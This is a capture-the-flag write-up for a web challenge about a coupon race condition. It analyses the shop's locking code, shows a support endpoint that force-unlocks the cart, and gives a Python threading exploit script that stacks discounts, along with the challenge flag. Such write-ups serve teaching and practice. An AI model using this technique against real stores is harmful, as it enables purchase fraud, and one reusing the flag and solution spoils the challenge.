# Arbitrage II: The Locked Market - Full Writeup

## Challenge Information
**Name:** Arbitrage Hard
**Category:** Web / Race Condition
**Difficulty:** Hard
**Goal:** Purchase "The Shadow Flag" which costs **$1,000** with a starting balance of **$100**.

## Description
The shop developers have implemented a "secure transaction lock" to prevent the coupon stacking vulnerability found in the previous version. They claim it's now impossible to apply the same coupon multiple times. Can you prove them wrong?

## Initial Reconnaissance
The application is a simple e-commerce site where you can buy items.
- **Items:**
    - Flag: $1000
    - Watch: $150
    - USB: $50
- **Starting Balance:** $100
- **Coupon:** `SHADOW_DISCOUNT` gives $100 off.

Attempting to apply the coupon multiple times normally results in an error: `Transaction in progress. Please wait.` or `Coupon already applied!`.

## Source Code Analysis
We are provided with the source code. Let's examine the `apply_coupon` logic in `app.js`.

```javascript
// app.js

// 1. CHECK
if (cart.coupons_applied > 0) {
    return res.json({ status: 'error', msg: 'Coupon already applied!' });
}

// 2. LOCK (Mitigation)
if (cart.locked) {
    return res.json({ status: 'error', msg: 'Transaction in progress. Please wait.' });
}
cart.locked = true;

try {
    // 3. LATENCY
    await sleep(500);

    // 4. ACT
    cart.coupons_applied += 1;
    cart.discount += COUPON_VALUE;
} finally {
    cart.locked = false;
}
```

The logic seems sound at first glance:
1.  It checks if a coupon is already applied.
2.  It checks if the cart is locked.
3.  It locks the cart.
4.  It waits (simulating processing time).
5.  It applies the discount.
6.  It unlocks the cart.

The lock prevents parallel requests from entering the critical section (steps 3-5) simultaneously.

### The Vulnerability: The "Support" Backdoor
However, searching the code for other references to `locked` reveals a suspicious endpoint:

```javascript
// New "Support" endpoint to fix stuck carts
app.post('/api/support/unlock_cart', (req, res) => {
    if (!req.session.user) return res.json({ status: 'error', msg: 'Login required' });
    const cart = carts[req.session.id];
    if (cart) {
        cart.locked = false; // <--- VULNERABILITY
        return res.json({ status: 'success', msg: 'Cart unlocked. Please try again.' });
    }
    return res.json({ status: 'error', msg: 'No cart found' });
});
```

This endpoint allows any authenticated user to **forcefully unlock their cart** at any time.

## Exploit Strategy
We can exploit this by manually unlocking the cart *while* a legitimate coupon application is in the `sleep(500)` phase.

**The Attack Flow:**
1.  **Thread A:** Sends `POST /cart/apply_coupon`.
    - Server: Checks lock (unlocked) -> Locks cart -> Sleeps 500ms.
2.  **Thread B:** Immediately sends `POST /api/support/unlock_cart`.
    - Server: Unlocks cart.
3.  **Thread C:** Sends `POST /cart/apply_coupon`.
    - Server: Checks lock (unlocked!) -> Locks cart -> Sleeps 500ms.
    - *Note:* Thread C passes the `if (cart.coupons_applied > 0)` check because Thread A is still sleeping and hasn't incremented the counter yet!

By repeating this pattern rapidly, we can stack multiple requests in the "sleep" phase. When they all wake up, they will all increment the discount, bypassing the limit.

## Solution Script
Here is the python script to automate the attack:

```python
import requests
import threading
import time

URL = "http://localhost:5001" # Change to target URL
s = requests.Session()

def solve():
    print("[*] Starting Arbitrage Hard Exploit...")

    # 1. Login
    s.post(f"{URL}/register", data={"username": "hacker"})

    # 2. Add Flag to cart
    s.post(f"{URL}/cart/add", data={"item": "flag"})

    # 3. Race Condition Attack
    print("[*] Launching attack threads...")
    threads = []
    
    def attack_step():
        s.post(f"{URL}/cart/apply_coupon", data={"code": "SHADOW_DISCOUNT"})

    # We need 10 coupons ($100 * 10 = $1000). Launch 15 to be safe.
    for i in range(15):
        t = threading.Thread(target=attack_step)
        threads.append(t)
        t.start()
        
        # Wait a tiny bit for the request to lock the cart
        time.sleep(0.05)
        
        # Force unlock so the next thread can enter
        s.post(f"{URL}/api/support/unlock_cart")
        print(f"[*] Thread {i+1} launched and cart unlocked")

    for t in threads:
        t.join()

    # 4. Checkout
    print("[*] Checking out...")
    res = s.post(f"{URL}/checkout/pay").json()
    
    if res.get('status') == 'win':
        print(f"[+] WIN! Flag: {res.get('flag')}")
    else:
        print(f"[-] Failed. Response: {res}")

if __name__ == "__main__":
    solve()
```

## Flag
`l3mon{l0cks_ar3_0nly_as_str0ng_as_th3_k3y_h0ld3r}`
